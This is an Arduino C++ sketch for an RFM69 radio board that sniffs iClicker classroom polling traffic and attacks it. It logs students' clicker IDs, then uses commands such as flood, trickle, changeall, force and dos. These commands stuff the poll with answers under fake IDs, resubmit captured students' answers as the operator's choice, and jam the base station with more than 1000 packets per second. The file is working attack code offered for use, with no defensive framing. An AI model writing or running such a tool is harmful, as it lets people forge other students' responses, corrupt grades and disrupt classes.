#include <Arduino.h>
#include <SPI.h>
#include <stdint.h>
#include <iClickerEmulator.h>
#include <RingBufCPP.h>
#include "charUtils.h"
#include "memory.h"
#include "list.h"
#include "hashtable.h"

#define MIN(a,b) ((a) < (b) ? (a) : (b))
#define MAX(a,b) ((a) > (b) ? (a) : (b))

// iClicker channel id macro - useful for switch statements
constexpr uint16_t _iid(char* c) {
	return ((uint16_t)c[0]) << 8 | c[1];
}

// iClicker id macro
uint32_t collapseId(uint8_t* id) {
	// TODO: ignore last byte since it's dependant on first 3? this value is used for the hash
	// function after all...
	return id[0] << 24 | id[1] << 16 | id[2] << 8 | id[3];
}
void expandId(uint32_t id, uint8_t* ida) {
	ida[0] = (id & 0xff000000) >> 24;
	ida[1] = (id & 0x00ff0000) >> 16;
	ida[2] = (id & 0x0000ff00) >> 8;
	ida[3] =  id & 0x000000ff;
}
void expandBogusId(uint32_t id, uint8_t* ida) {
	ida[0] = (id & 0xff0000) >> 16;
	ida[1] = (id & 0x00ff00) >> 8;
	ida[2] =  id & 0x0000ff;
	ida[3] = ida[0] ^ ida[1] ^ ida[2];
}

// Radio properties
#define IS_RFM69HW true //make true if using w version
#define IRQ_PIN 3 // This is 3 on adafruit feather
#define CSN 8 // This is 8 on adafruit feather

// Other hardware properties
#define LED 13
bool LED_on = false;

// Channel we're going to operate on
iClickerChannel Channel = iClickerChannels::AA;

// iClicker instance
iClickerEmulator Clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);

// Buffer for incoming serial commands
const int SerialBufLen = 100;
char SerialBuf[SerialBufLen + 1];

// Utility buffer to be reused later
const int UBufLen = 100;
char UBuf[UBufLen + 1];

// Database of iClicker ids belonging to other students
// TODO implement later. Or just make the responses hashTable persist after reset and change answer
// value.
//list<long> clickerIdDatabase;

iClickerAnswer Answers[] = { ANSWER_A, ANSWER_B, ANSWER_C, ANSWER_D, ANSWER_E };

// Current poll status info
// Store number of each answer in array for quick access
int poll[5];
int nResponses;

// Maintain hash map for unique IDs
#define ResponseBins 500 // Probably at most 300 legit responses... 500 should be good
hashTable<char> responses(ResponseBins);

// Track bogusResponses
uint32_t baseBogusID = 0xBBAA11;
uint32_t bogusID = baseBogusID;
int nBogusIDs = 0;

// Seperate poll for bogus responses
int bogusPoll[5];

// Poll methods
void resetPoll() {
	for(int i = 0; i < 5; i++) {
		poll[i] = 0;
		bogusPoll[i] = 0;
	}
	nResponses = 0;
	responses.clear();
}
void updatePoll(uint8_t* id, char a) {
	// Update the entry in the hash table and update local counters
	tableEntry<char>* entry = responses.getEntry(collapseId(id));
	if(entry == null) {
		responses.set(collapseId(id), a);
		nResponses++;
	} else {
		poll[entry->value - 65]--;
		entry->value = a;
	}
	// We know a >= 'A' && a <= 'E'
	poll[a - 65]++;
}
void updatePollBogus(char a) {
	bogusPoll[a - 65]++;
}
void updatePollBogus(iClickerAnswer a) {
	bogusPoll[a]++;
}
void clearBogusPoll() {
	for(int i = 0; i < 5; i++)
		bogusPoll[i] = 0;
}

// Operation
enum Operation { flood, trickle, changeall, rotate, force, eq, dos, idle };

Operation operation = idle;
char operationMode = null;
// Let operation keep track of where it is...
int operationCounter;
int seqCounter;
//void* operationState;

// Program config
#define MAX_BUFFERED_PACKETS 50
#define REPLY_TO_CLICKERS false

// Packet buffer for intercepted packets
RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> RecvBuf;

void printCommas(int n) {
	if(n < 1000)
		Serial.printf("%d", n);
	else {
		printCommas(n / 1000);
		Serial.printf(",%03d", n % 1000);
	}
}

void printFreeMemory() {
	int f = freeMemory();
	Serial.print("Free memory: ");
	printCommas(f);
	Serial.println(" bytes");
}

void printHelpMessage() {
	Serial.println("┌ help             Prints this help message");
	Serial.println("│ setchannel <ch>  Changes the operating channel");
	Serial.println("│ status           Prints poll status");
	Serial.println("│ reset            Resets current poll state");
	Serial.println("│ abort            Cancels the current operation");
	Serial.println("├──────────┤");
	Serial.println("│ flood <mode>     Floods base station with mode in answer, random, uniform, "
		"seq");
	Serial.println("│ trickle <mode>   Slowly sends bogus answers with mode in answer, random, "
		"uniform, seq");
	Serial.println("│ changeall <ans>  Changes all submitted answers to the given answer (or "
		"uniform)");
	Serial.println("│ rotate           Changes all answers to A then B then C then ...");
	Serial.println("│ force <ans>      Quickly resubmits all incoming answers as ans");
	Serial.println("│ dos              Attempts to flood base station with more than 1000 "
		"responses/sec");
	Serial.println("└ eq               Evens out the histogram");
}

void handlePackets() {
	char msg[50];
	iClickerPacket r;
	while (RecvBuf.pull(&r)) {
		uint8_t* id = r.packet.answerPacket.id;
		iClickerAnswer ans = r.packet.answerPacket.answer;
		char answer = iClickerEmulator::answerChar(ans);
		if(operation == force && answer != operationMode && answer != 'P') {
			snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c -> %c", r.type == PACKET_ANSWER ?
				'a' : 'r', id[0], id[1], id[2], id[3], answer, operationMode);
			Serial.println(msg);
			Clicker.submitAnswer(id, Answers[operationMode - 'A']);
			updatePoll(id, operationMode);
			// Promiscuous is re-engaged later in loop...
		} else if(answer != 'P' && answer != 'X') {
			// answer is in {'A', 'B', 'C', 'D', 'E'}
			snprintf(msg, sizeof(msg), "[%c][%02X%02X%02X%02X]  %c", r.type == PACKET_ANSWER ? 'a' :
				'r', id[0], id[1], id[2], id[3], answer);
			Serial.println(msg);
			updatePoll(id, answer);
		}
	}
}

bool loadCommand() {
	// Loads command from serial input into SerialBuf
	// Returns true if loaded successfully
	int i = 0;
	int c;
	while(i < SerialBufLen) {
		if(Serial.available()) {
			if((c = Serial.read()) == 0xa) // End char is 0xa == "\n"
				break;
			else
				SerialBuf[i++] = c;
		} else
			delay(100);
	}
	if(i <= SerialBufLen)
		// If we didn't overrun the buffer, add the null terminator back in
		SerialBuf[i] = 0x0;
	else {
		// If we did overrun the buffer, clear any remaining data in the Serial
		while(Serial.available())
			Serial.read();
		Serial.println("[Error] Serial larger than buffer");
		// A command shouldn't be longer than the buffer length...
		return false;
	}
	return true;
}

void handleCommand() {
	// Convert the whole command to lowercase
	cToLower(SerialBuf);
	// Load the actual command part into UBuf
	int cmdi = getFragment(SerialBuf, 0, UBuf);
	// Handle command
	if(cEquals(UBuf, "help")) {
		printHelpMessage();
	} else if(cEquals(UBuf, "setchannel")) {
		// Load argument into UBuf
		getFragment(SerialBuf, cmdi, UBuf);
		bool known = true;
		switch(_iid(UBuf)) { // This switch statement sucked to write and sucks to look at
			case _iid("aa"):
				Channel = iClickerChannels::AA;
				break;
			case _iid("ab"):
				Channel = iClickerChannels::AB;
				break;
			case _iid("ac"):
				Channel = iClickerChannels::AC;
				break;
			case _iid("ad"):
				Channel = iClickerChannels::AD;
				break;
			case _iid("ba"):
				Channel = iClickerChannels::BA;
				break;
			case _iid("bb"):
				Channel = iClickerChannels::BB;
				break;
			case _iid("bc"):
				Channel = iClickerChannels::BC;
				break;
			case _iid("bd"):
				Channel = iClickerChannels::BD;
				break;
			case _iid("ca"):
				Channel = iClickerChannels::CA;
				break;
			case _iid("cb"):
				Channel = iClickerChannels::CB;
				break;
			case _iid("cc"):
				Channel = iClickerChannels::CC;
				break;
			case _iid("cd"):
				Channel = iClickerChannels::CD;
				break;
			case _iid("da"):
				Channel = iClickerChannels::DA;
				break;
			case _iid("db"):
				Channel = iClickerChannels::DB;
				break;
			case _iid("dc"):
				Channel = iClickerChannels::DC;
				break;
			case _iid("dd"):
				Channel = iClickerChannels::DD;
				break;
			default:
				// Channel is unknown
				Serial.print("[Error] Unknown channel \"");
				Serial.print(UBuf);
				Serial.println("\"");
				known = false;
				break;
		}
		if(known) {
			// Actually change the channel
			Clicker.setChannel(Channel);
			// Restart promiscuous
			Clicker.stopPromiscuous();
			Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
			// Reply
			cToUpper(UBuf); // Convert channel name to uppercase
			Serial.print("Switched to channel \"");
			Serial.print(UBuf);
			Serial.println("\"");
		}
	} else if(cEquals(UBuf, "status")) {
		Serial.printf("Responses: %d\n", nResponses);
		Serial.printf("Bogus responses: %d\n", nBogusIDs);
		// Print out poll status
		for(int i = 0; i < 5; i++) {
			Serial.print((char)(i + 65));
			Serial.print(" -\t");
			Serial.print(poll[i]);
			Serial.print("\t");
			Serial.print(bogusPoll[i]);
			Serial.print("\t");
			Serial.println(poll[i] + bogusPoll[i]);
		}
		// Some system info
		printFreeMemory();
	} else if(cEquals(UBuf, "mapstatus")) {
		// For debug purposes......
		Serial.printf("nBins: %d\n", responses.getNBins());
		Serial.print("loadFactor: ");
		Serial.print((float)responses.getFilled() / (float)responses.getNBins());
		Serial.print("\n");
		tableEntry<char>* bins = responses.getBins();
		Serial.printf("========\n");
		for(int i = 0; i < responses.getNBins(); i++) {
			if(bins[i].state == alloc)
				Serial.printf("%2d", responses.getWork(bins[i].key));
			else
				Serial.printf("%2d", 0);
			if(i == responses.getNBins() - 1 || (i + 1) % 20 == 0)
				Serial.printf("\n");
			else
				Serial.printf(" ");
		}
	} else if(cEquals(UBuf, "reset")) {
		Serial.println("Resetting poll");
		// Reset poll status
		resetPoll();
		// Reset current operation? I guess why not...
		operation = idle;
		operationMode = null;
	} else if(cEquals(UBuf, "abort")) {
		Serial.println("Aborting current operation");
		// Cancel current operation?
		operation = idle;
		operationMode = null;
	} else if(cEquals(UBuf, "flood")) {
		Serial.println("Starting flood");
		// Extract parameter
		getFragment(SerialBuf, cmdi, UBuf);
		// Only really need to look at first char
		if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
				UBuf[0] == 'e' || UBuf[0] == 'r' || UBuf[0] == 'u' || UBuf[0] == 's') {
			operation = flood;
			operationMode = UBuf[0];
			seqCounter = 0;
		} else {
			Serial.print("[Error] Unknown flood mode \"");
			Serial.print(UBuf);
			Serial.println("\"");
		}
	} else if(cEquals(UBuf, "trickle")) {
		Serial.println("Starting trickle");
		// Extract parameter
		getFragment(SerialBuf, cmdi, UBuf);
		// Only really need to look at first char
		if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
				UBuf[0] == 'e' || UBuf[0] == 'r' || UBuf[0] == 'u' || UBuf[0] == 's') {
			operation = trickle;
			operationMode = UBuf[0];
			operationCounter = 0;
			seqCounter = 0;
		} else {
			Serial.print("[Error] Unknown trickle mode \"");
			Serial.print(UBuf);
			Serial.println("\"");
		}
	} else if(cEquals(UBuf, "changeall")) {
		Serial.println("Starting changeall");
		// Extract parameter
		getFragment(SerialBuf, cmdi, UBuf);
		// Only really need to compare first char
		if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
				UBuf[0] == 'e' || UBuf[0] == 'u') {
			operation = changeall;
			operationMode = cUpper(UBuf[0]);
		} else {
			Serial.print("[Error] Unknown changeall mode \"");
			Serial.print(UBuf);
			Serial.println("\"");
		}
	} else if(cEquals(UBuf, "rotate")) {
		Serial.println("Starting rotate");
		operation = rotate;
		operationMode = 'A';
		operationCounter = 0;
	} else if(cEquals(UBuf, "force")) {
		Serial.println("Starting force");
		// Extract parameter
		getFragment(SerialBuf, cmdi, UBuf);
		if(UBuf[0] == 'a' || UBuf[0] == 'b' || UBuf[0] == 'c' || UBuf[0] == 'd' ||
				UBuf[0] == 'e') {
			operation = force;
			operationMode = cUpper(UBuf[0]);
		} else {
			Serial.print("[Error] Unknown flood mode \"");
			Serial.print(UBuf);
			Serial.println("\"");
		}
	} else if(cEquals(UBuf, "dos")) {
		Serial.println("Starting dos");
		// Set operation
		operation = dos;
	} else if(cEquals(UBuf, "eq")) {
		Serial.println("Starting equalization");
		// Set operation
		operation = eq;
	} else {
		Serial.print("[Error] Unknown command \"");
		Serial.print(UBuf);
		Serial.println("\"");
	}
}

void recvPacketHandler(iClickerPacket *recvd) {
	#if REPLY_TO_CLICKERS
	// Send acknowledgement to clicker. Acting as a base station.
	// It might make sense to move this to the loop, however it is important that the
	// acknowledgement is sent quickly.
	if (recvd->type == PACKET_ANSWER) {
		Clicker.acknowledgeAnswer(&recvd->packet.answerPacket, true);
		// restore the frequency back to AA and go back to promiscous mode
		Clicker.setChannel(Channel);
		Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	}
	#endif
	// Add packet to the buffer
	RecvBuf.add(*recvd);
}

void command_flood() {
	// Flood the base station with a ton of answers
	// Not DOS level, but a lot
	// Sends about 200 responses per second
	// ~20 per loop
	char msg[50];
	uint8_t id[4];
	for(int i = 0; i < 20; i++) {
		iClickerAnswer answer;
		switch(operationMode) {
			case 'a':
				answer = ANSWER_A;
				break;
			case 'b':
				answer = ANSWER_B;
				break;
			case 'c':
				answer = ANSWER_C;
				break;
			case 'd':
				answer = ANSWER_D;
				break;
			case 'e':
				answer = ANSWER_E;
				break;
			case 'r':
				answer = iClickerEmulator::randomAnswer();
				break;
			case 'u':
				{ // creating variables will node a scope
					int max = 0;
					int maxAnsi;
					for(int i = 0; i < 5; i++)
						if(poll[i] >= max) {
							max = poll[i];
							maxAnsi = i;
						}
					iClickerAnswer maxAns = Answers[maxAnsi];
					do
						answer = iClickerEmulator::randomAnswer();
					while(answer != maxAns);
				}
				break;
			case 's':
				answer = Answers[seqCounter];
				seqCounter = (seqCounter + 1) % 5;
				break;
		}
		expandBogusId(bogusID++, id);
		nBogusIDs++;
		Clicker.submitAnswer(id, answer);
		updatePollBogus(answer);
		snprintf(msg, sizeof(msg), "[*][%02X%02X%02X%02X]  %c", id[0], id[1], id[2], id[3],
			iClickerEmulator::answerChar(answer));
		Serial.println(msg);
	}
}

void command_trickle() {
	// Slowly sends bogus answers to base station
	// Sends about 5 per second
	char msg[50];
	uint8_t id[4];
	operationCounter++;
	if(operationCounter %= 2) {
		iClickerAnswer answer;
		switch(operationMode) {
			case 'a':
				answer = ANSWER_A;
				break;
			case 'b':
				answer = ANSWER_B;
				break;
			case 'c':
				answer = ANSWER_C;
				break;
			case 'd':
				answer = ANSWER_D;
				break;
			case 'e':
				answer = ANSWER_E;
				break;
			case 'r':
				answer = iClickerEmulator::randomAnswer();
				break;
			case 'u':
				{ // creating variables will node a scope
					int max = 0;
					int maxAnsi;
					for(int i = 0; i < 5; i++)
						if(poll[i] >= max) {
							max = poll[i];
							maxAnsi = i;
						}
					iClickerAnswer maxAns = Answers[maxAnsi];
					do
						answer = iClickerEmulator::randomAnswer();
					while(answer != maxAns);
				}
				break;
			case 's':
				answer = Answers[seqCounter];
				seqCounter = (seqCounter + 1) % 5;
				break;
		}
		expandBogusId(bogusID++, id);
		nBogusIDs++;
		Clicker.submitAnswer(id, answer);
		updatePollBogus(answer);
		snprintf(msg, sizeof(msg), "[*][%02X%02X%02X%02X]  %c", id[0], id[1], id[2], id[3],
			iClickerEmulator::answerChar(answer));
		Serial.println(msg);
	}
}

void command_changeall() {
	// Changes all answers to a given answer
	// Changes both student IDs and fake IDs
	// Just do it all in one go. Hopefully don't miss too much in the process...
	char msg[50];
	if(operationMode >= 'A' && operationMode <= 'E') {
		iClickerAnswer answer = Answers[operationMode - 'A'];
		// Change legit responses
		int keys[ResponseBins];
		int nKeys = responses.getKeys(keys);
		uint8_t ida[4];
		for(int i = 0; i < nKeys; i++) {
			expandId(keys[i], ida);
			Clicker.submitAnswer(ida, answer);
			// TODO: make message say oldAns -> newAns
			snprintf(msg, sizeof(msg), "[->][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
				ida[3], operationMode);
			Serial.println(msg);
			updatePoll(ida, operationMode);
		}
		// Change bogus responses
		clearBogusPoll();
		uint32_t id = baseBogusID;
		for(int i = 0; i < nBogusIDs; i++) {
			expandBogusId(id++, ida);
			Clicker.submitAnswer(ida, answer);
			updatePollBogus(answer);
			snprintf(msg, sizeof(msg), "[*>][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
				ida[3], operationMode);
			Serial.println(msg);
		}
	} else {
		// then uniform
		int answer = 0;
		// chaneg legit answers
		int keys[ResponseBins];
		int nKeys = responses.getKeys(keys);
		uint8_t ida[4];
		for(int i = 0; i < nKeys; i++) {
			expandId(keys[i], ida);
			Clicker.submitAnswer(ida, Answers[answer % 5]);
			// TODO: make message say oldAns -> newAns
			snprintf(msg, sizeof(msg), "[->][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
				ida[3], iClickerEmulator::answerChar(Answers[answer % 5]));
			Serial.println(msg);
			updatePoll(ida, iClickerEmulator::answerChar(Answers[answer % 5]));
			answer++;
		}
		// change bogus answers
		clearBogusPoll();
		uint32_t id = baseBogusID;
		for(int i = 0; i < nBogusIDs; i++) {
			expandBogusId(id++, ida);
			Clicker.submitAnswer(ida, Answers[answer % 5]);
			snprintf(msg, sizeof(msg), "[*>][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
				ida[3], iClickerEmulator::answerChar(Answers[answer % 5]));
			Serial.println(msg);
			updatePollBogus(Answers[answer % 5]);
			answer++;
		}
	}
	// Finished, reset operation
	Serial.println("Finished changeall");
	operation = idle;
}

void command_rotate() {
	// Rotate the answers from a to b to c to ...
	char msg[50];
	if(operationCounter == 0) {
		iClickerAnswer answer = Answers[operationMode - 'A'];
		// Change legit responses
		int keys[ResponseBins];
		int nKeys = responses.getKeys(keys);
		uint8_t ida[4];
		for(int i = 0; i < nKeys; i++) {
			expandId(keys[i], ida);
			Clicker.submitAnswer(ida, answer);
			// TODO: make message say oldAns -> newAns
			snprintf(msg, sizeof(msg), "[->][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
				ida[3], operationMode);
			Serial.println(msg);
			updatePoll(ida, operationMode);
		}
		// Change bogus responses
		clearBogusPoll();
		uint32_t id = baseBogusID;
		for(int i = 0; i < nBogusIDs; i++) {
			expandBogusId(id++, ida);
			Clicker.submitAnswer(ida, answer);
			updatePollBogus(answer);
			snprintf(msg, sizeof(msg), "[*>][%02X%02X%02X%02X]  %c", ida[0], ida[1], ida[2],
				ida[3], operationMode);
			Serial.println(msg);
		}

		operationMode++;
		if(operationMode > 'E')
			operationMode = 'A';
		Serial.println("Finished rotate loop");
	}
	operationCounter++;
	operationCounter %= 5;
}

void command_eq() {
	// Attempts to equalize histogram using bogus answers
	// About 160 responses per second max
	// Get max response
	int max = 0;
	for(int i = 0; i < 5; i++)
		if(poll[i] + bogusPoll[i] > max)
			max = poll[i] + bogusPoll[i];
	// Figure out how many responses to send per bin
	int counts[5];
	for(int i = 0; i < 5; i++)
		counts[i] = max - poll[i] - bogusPoll[i];
	// Submit bogus responses to equalize histogram
	uint8_t id[4];
	char msg[50];
	for(int i = 0; i < 5; i++)
		if(counts[i] > 0)
			for(int j = 0; j < MIN(counts[i], 4); j++) {
				expandBogusId(bogusID++, id);
				nBogusIDs++;
				Clicker.submitAnswer(id, Answers[i]);
				updatePollBogus(Answers[i]);
				snprintf(msg, sizeof(msg), "[=][%02X%02X%02X%02X]  %c", id[0], id[1], id[2], id[3],
					iClickerEmulator::answerChar(Answers[i]));
				Serial.println(msg);
			}
}

void command_dos() {
	// Attempts to flood base station with more than 1000 submissions per second
	Serial.println("Send any data over serial to abort.");
	// Generate new random ID for dos
	uint8_t id[4];
	iClickerEmulator::randomId(id);
	int i;
	while(!Serial.available()) { // Stop when input is received from serial
		unsigned long start = micros();
		i = 1000;
		while(i--) {
			// Send bogus packet
			Clicker.submitAnswer(id, iClickerAnswer::ANSWER_A);
		}
		unsigned long end = micros();
		// delta / 1000 = microseconds / packet = A
		// 1000000 microseconds / A = packets per second?
		Serial.println(1000000 / ((end - start) / 1000));
	}
	// we don't care about that input - clear it
	while(Serial.available()) Serial.read();
	// Inform user that dos is finished
	Serial.println("\nFinished dos");
	operation = idle;
	updatePoll(id, 'a');
}

// Main code
void setup() {
	// Setup LED
	pinMode(LED, OUTPUT);
	digitalWrite(LED, HIGH);
	// Setup Serial
	Serial.begin(9600);
	while (!Serial) ; // Wait for serial port to be available
	Serial.println("Hello.");
	// Setup poll status
	resetPoll(); // Just make sure everything is zeroed
	// Setup serial buffer
	SerialBuf[SerialBufLen] = 0x0; // just for thouroughness
	// Setup clicker
	Clicker.begin(Channel);
	Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	Serial.println("Started promiscouous.");
	// Print help message
	printHelpMessage();
}

void loop() {
	// Blink led
	//digitalWrite(LED, (LED_on = !LED_on) ? LOW : HIGH);

	// Process packets
	handlePackets();

	// Handle any serial commands
	if(Serial.available()) {
		if(loadCommand()) {
			// Echo command back
			Serial.print("--> ");
			Serial.println(SerialBuf);
			handleCommand();
		}
	}

	// Handle operation
	if(operation != idle) {
		switch(operation) {
			case flood:
				command_flood();
				break;
			case trickle:
				command_trickle();
				break;
			case changeall:
				command_changeall();
				break;
			case rotate:
				command_rotate();
				break;
			case eq:
				command_eq();
				break;
			case dos:
				command_dos();
				break;
		}
		// All operations involve transmission. Promiscouous mode needs to be restarted.
		Clicker.setChannel(Channel);
		Clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	}

	// Pause for a little bit
	delay(100);
}
